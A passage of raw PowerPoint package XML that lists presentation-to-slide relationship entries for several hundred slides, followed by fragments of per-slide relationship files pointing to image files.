Id="rId690" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide684.xml"/><Relationship Id="rId691" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide685.xml"/><Relationship Id="rId692" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide686.xml"/><Relationship Id="rId693" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide687.xml"/><Relationship Id="rId694" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide688.xml"/><Relationship Id="rId695" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide689.xml"/><Relationship Id="rId696" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide690.xml"/><Relationship Id="rId697" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide691.xml"/><Relationship Id="rId698" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide692.xml"/><Relationship Id="rId699" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide693.xml"/><Relationship Id="rId700" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide694.xml"/><Relationship Id="rId701" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide695.xml"/><Relationship Id="rId702" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide696.xml"/><Relationship Id="rId703" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide697.xml"/><Relationship Id="rId704" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide698.xml"/><Relationship Id="rId705" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide699.xml"/><Relationship Id="rId706" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide700.xml"/><Relationship Id="rId707" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide701.xml"/><Relationship Id="rId708" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide702.xml"/><Relationship Id="rId709" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide703.xml"/><Relationship Id="rId710" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide704.xml"/><Relationship Id="rId711" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide705.xml"/><Relationship Id="rId712" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide706.xml"/><Relationship Id="rId713" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide707.xml"/><Relationship Id="rId714" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide708.xml"/><Relationship Id="rId715" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide709.xml"/><Relationship Id="rId716" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide710.xml"/><Relationship Id="rId717" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide711.xml"/><Relationship Id="rId718" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide712.xml"/><Relationship Id="rId719" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide713.xml"/><Relationship Id="rId720" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide714.xml"/><Relationship Id="rId721" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide715.xml"/><Relationship Id="rId722" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide716.xml"/><Relationship Id="rId723" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide717.xml"/><Relationship Id="rId724" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide718.xml"/><Relationship Id="rId725" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide719.xml"/><Relationship Id="rId726" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide720.xml"/><Relationship Id="rId727" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide721.xml"/><Relationship Id="rId728" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide722.xml"/><Relationship Id="rId729" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide723.xml"/><Relationship Id="rId730" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide724.xml"/><Relationship Id="rId731" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide725.xml"/><Relationship Id="rId732" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide726.xml"/><Relationship Id="rId733" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide727.xml"/><Relationship Id="rId734" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide728.xml"/><Relationship Id="rId735" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide729.xml"/><Relationship Id="rId736" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide730.xml"/><Relationship Id="rId737" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide731.xml"/><Relationship Id="rId738" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide732.xml"/><Relationship Id="rId739" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide733.xml"/><Relationship Id="rId740" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide734.xml"/><Relationship Id="rId741" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide735.xml"/><Relationship Id="rId742" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide736.xml"/><Relationship Id="rId743" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide737.xml"/><Relationship Id="rId744" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide738.xml"/><Relationship Id="rId745" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide739.xml"/><Relationship Id="rId746" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide740.xml"/><Relationship Id="rId747" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide741.xml"/><Relationship Id="rId748" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide742.xml"/><Relationship Id="rId749" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide743.xml"/><Relationship Id="rId750" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide744.xml"/><Relationship Id="rId751" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide745.xml"/><Relationship Id="rId752" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide746.xml"/><Relationship Id="rId753" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide747.xml"/><Relationship Id="rId754" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide748.xml"/><Relationship Id="rId755" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide749.xml"/><Relationship Id="rId756" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide750.xml"/><Relationship Id="rId757" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide751.xml"/><Relationship Id="rId758" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide752.xml"/><Relationship Id="rId759" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide753.xml"/><Relationship Id="rId760" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide754.xml"/><Relationship Id="rId761" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide755.xml"/><Relationship Id="rId762" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide756.xml"/><Relationship Id="rId763" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide757.xml"/><Relationship Id="rId764" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide758.xml"/><Relationship Id="rId765" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide759.xml"/><Relationship Id="rId766" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide760.xml"/><Relationship Id="rId767" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide761.xml"/><Relationship Id="rId768" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide762.xml"/><Relationship Id="rId769" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide763.xml"/><Relationship Id="rId770" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide764.xml"/><Relationship Id="rId771" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide765.xml"/><Relationship Id="rId772" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide766.xml"/><Relationship Id="rId773" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide767.xml"/><Relationship Id="rId774" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide768.xml"/><Relationship Id="rId775" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide769.xml"/><Relationship Id="rId776" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide770.xml"/><Relationship Id="rId777" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide771.xml"/><Relationship Id="rId778" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide772.xml"/><Relationship Id="rId779" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide773.xml"/><Relationship Id="rId780" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide774.xml"/><Relationship Id="rId781" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide775.xml"/><Relationship Id="rId782" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide776.xml"/><Relationship Id="rId783" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide777.xml"/><Relationship Id="rId784" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide778.xml"/><Relationship Id="rId785" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide779.xml"/><Relationship Id="rId786" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide780.xml"/><Relationship Id="rId787" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide781.xml"/><Relationship Id="rId788" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide782.xml"/><Relationship Id="rId789" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide783.xml"/><Relationship Id="rId790" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide784.xml"/><Relationship Id="rId791" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide785.xml"/><Relationship Id="rId792" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide786.xml"/><Relationship Id="rId793" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide787.xml"/><Relationship Id="rId794" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide788.xml"/><Relationship Id="rId795" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide789.xml"/><Relationship Id="rId796" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide790.xml"/><Relationship Id="rId797" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide791.xml"/><Relationship Id="rId798" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide792.xml"/><Relationship Id="rId799" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide793.xml"/><Relationship Id="rId800" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide794.xml"/><Relationship Id="rId801" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide795.xml"/><Relationship Id="rId802" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide796.xml"/><Relationship Id="rId803" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide797.xml"/><Relationship Id="rId804" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide798.xml"/><Relationship Id="rId805" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide799.xml"/><Relationship Id="rId806" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide800.xml"/><Relationship Id="rId807" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide801.xml"/><Relationship Id="rId808" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide802.xml"/><Relationship Id="rId809" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide803.xml"/><Relationship Id="rId810" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide804.xml"/><Relationship Id="rId811" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide805.xml"/><Relationship Id="rId812" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide806.xml"/><Relationship Id="rId813" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide807.xml"/><Relationship Id="rId814" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide808.xml"/><Relationship Id="rId815" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide809.xml"/><Relationship Id="rId816" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide810.xml"/><Relationship Id="rId817" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide811.xml"/><Relationship Id="rId818" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide812.xml"/><Relationship Id="rId819" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide813.xml"/><Relationship Id="rId820" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide814.xml"/><Relationship Id="rId821" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide815.xml"/><Relationship Id="rId822" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide816.xml"/><Relationship Id="rId823" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide817.xml"/><Relationship Id="rId824" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide818.xml"/><Relationship Id="rId825" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide819.xml"/><Relationship Id="rId826" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide820.xml"/><Relationship Id="rId827" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide821.xml"/><Relationship Id="rId828" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide822.xml"/><Relationship Id="rId829" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide823.xml"/><Relationship Id="rId830" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide824.xml"/><Relationship Id="rId831" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide825.xml"/><Relationship Id="rId832" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide826.xml"/><Relationship Id="rId833" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide827.xml"/><Relationship Id="rId834" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide828.xml"/><Relationship Id="rId835" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide829.xml"/><Relationship Id="rId836" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide830.xml"/><Relationship Id="rId837" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide831.xml"/><Relationship Id="rId838" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide832.xml"/><Relationship Id="rId839" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide833.xml"/><Relationship Id="rId840" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide834.xml"/><Relationship Id="rId841" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide835.xml"/><Relationship Id="rId842" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide836.xml"/><Relationship Id="rId843" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide837.xml"/><Relationship Id="rId844" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide838.xml"/><Relationship Id="rId845" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide839.xml"/><Relationship Id="rId846" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide840.xml"/><Relationship Id="rId847" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide841.xml"/><Relationship Id="rId848" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide842.xml"/><Relationship Id="rId849" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide843.xml"/><Relationship Id="rId850" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide844.xml"/><Relationship Id="rId851" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide845.xml"/><Relationship Id="rId852" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide846.xml"/><Relationship Id="rId853" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide847.xml"/><Relationship Id="rId854" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide848.xml"/><Relationship Id="rId855" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide849.xml"/><Relationship Id="rId856" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide850.xml"/><Relationship Id="rId857" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide851.xml"/><Relationship Id="rId858" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide852.xml"/><Relationship Id="rId859" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide853.xml"/><Relationship Id="rId860" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide854.xml"/><Relationship Id="rId861" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide855.xml"/><Relationship Id="rId862" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide856.xml"/><Relationship Id="rId863" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide857.xml"/><Relationship Id="rId864" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide858.xml"/><Relationship Id="rId865" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide859.xml"/><Relationship Id="rId866" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide860.xml"/><Relationship Id="rId867" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide861.xml"/><Relationship Id="rId868" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide862.xml"/><Relationship Id="rId869" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide863.xml"/><Relationship Id="rId870" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide864.xml"/><Relationship Id="rId871" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide865.xml"/><Relationship Id="rId872" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide866.xml"/><Relationship Id="rId873" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide867.xml"/><Relationship Id="rId874" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide868.xml"/><Relationship Id="rId875" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide869.xml"/><Relationship Id="rId876" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide870.xml"/><Relationship Id="rId877" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide871.xml"/><Relationship Id="rId878" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide872.xml"/><Relationship Id="rId879" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide873.xml"/><Relationship Id="rId880" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide874.xml"/><Relationship Id="rId881" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide875.xml"/><Relationship Id="rId882" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide876.xml"/><Relationship Id="rId883" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide877.xml"/><Relationship Id="rId884" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide878.xml"/><Relationship Id="rId885" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide879.xml"/><Relationship Id="rId886" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide880.xml"/><Relationship Id="rId887" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide881.xml"/><Relationship Id="rId888" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide882.xml"/><Relationship Id="rId889" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide883.xml"/><Relationship Id="rId890" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide884.xml"/><Relationship Id="rId891" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide885.xml"/><Relationship Id="rId892" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide886.xml"/><Relationship Id="rId893" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide887.xml"/><Relationship Id="rId894" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide888.xml"/><Relationship Id="rId895" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide889.xml"/><Relationship Id="rId896" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide890.xml"/><Relationship Id="rId897" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide891.xml"/><Relationship Id="rId898" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide892.xml"/><Relationship Id="rId899" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide893.xml"/><Relationship Id="rId900" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide894.xml"/><Relationship Id="rId901" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide895.xml"/><Relationship Id="rId902" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide896.xml"/><Relationship Id="rId903" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide897.xml"/><Relationship Id="rId904" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide898.xml"/><Relationship Id="rId905" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide899.xml"/><Relationship Id="rId906" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide900.xml"/><Relationship Id="rId907" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide901.xml"/><Relationship Id="rId908" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide902.xml"/><Relationship Id="rId909" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide903.xml"/><Relationship Id="rId910" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide904.xml"/><Relationship Id="rId911" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide905.xml"/><Relationship Id="rId912" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide906.xml"/><Relationship Id="rId913" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide907.xml"/><Relationship Id="rId914" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide908.xml"/><Relationship Id="rId915" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide909.xml"/><Relationship Id="rId916" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide910.xml"/><Relationship Id="rId917" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide911.xml"/><Relationship Id="rId918" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide912.xml"/><Relationship Id="rId919" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide913.xml"/><Relationship Id="rId920" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide914.xml"/><Relationship Id="rId921" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide915.xml"/><Relationship Id="rId922" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide916.xml"/><Relationship Id="rId923" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide917.xml"/><Relationship Id="rId924" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide918.xml"/><Relationship Id="rId925" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide91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2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2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s>
</file>

<file path=ppt/slides/_rels/slide2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s>
</file>

<file path=ppt/slides/_rels/slide2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s>
</file>

<file path=ppt/slides/_rels/slide3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s>
</file>

<file path=ppt/slides/_rels/slide3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s>
</file>

<file path=ppt/slides/_rels/slide3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s>
</file>

<file path=ppt/slides/_rels/slide3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s>
</file>

<file path=ppt/slides/_rels/slide3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png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide3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png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide3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png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide4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png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide4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png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide4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7.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide4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8.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide4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s>
</file>

<file path=ppt/slides/_rels/slide4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9.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide4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0.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide4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1.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide4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2.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide4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png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide4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4.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide5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png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide5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6.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide5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7.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide5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8.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide5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9.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide5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0.png"/></Relationships>
</file>

